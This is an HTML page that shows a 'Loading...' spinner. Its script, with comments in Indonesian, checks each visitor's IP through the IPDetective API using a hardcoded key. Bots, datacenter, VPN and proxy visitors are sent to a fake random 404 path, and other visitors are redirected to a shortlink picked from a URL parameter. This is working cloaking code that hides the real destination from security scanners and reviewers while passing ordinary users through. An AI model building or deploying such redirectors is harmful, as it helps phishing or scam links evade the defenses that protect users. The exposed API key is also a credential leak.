<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #fff;
    }
    .spinner {
      width: 60px;
      height: 60px;
      border: 6px solid rgba(255, 0, 0, 0.3);
      border-top: 6px solid red;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      color: #111;
      font-family: Arial, sans-serif;
      margin-top: 15px;
      text-align: center;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="spinner"></div>
    <p id="message">Loading...</p>
  </div>

  <script>
    const apiKey = "e8035f4f-bdb7-4fbc-aaca-ba226fa2c064";

    // Daftar shortlink
    const links = {
      "gg": "https://o2o.to/i/7BXCO5I40YQZ",
    };

    // Ambil parameter `to` dari URL
    const params = new URLSearchParams(window.location.search);
    const target = params.get("to");

    async function checkVisitor() {
      try {
        const res = await fetch("https://api.ipdetective.io/ip?info=true", {
          headers: { "x-api-key": apiKey }
        });
        const data = await res.json();

        console.log("IPDetective response:", data); // debug log

        // Anggap bot kalau flag `bot = true` atau type = datacenter/vpn/proxy
        if (data.bot || ["datacenter", "bot", "vpn", "proxy"].includes(data.type)) {
          const fakePath = "/404-" + Math.random().toString(36).substring(2);
          window.location.href = fakePath;
        } else {
          if (target && links[target]) {
            document.getElementById("message").textContent = "Loading...";
            window.location.href = links[target];
          } else {
            document.getElementById("message").textContent = "Loading...";
          }
        }
      } catch (err) {
        console.error(err);
        document.getElementById("message").textContent = "Verification failed.";
      }
    }

    checkVisitor();
  </script>
</body>
</html>
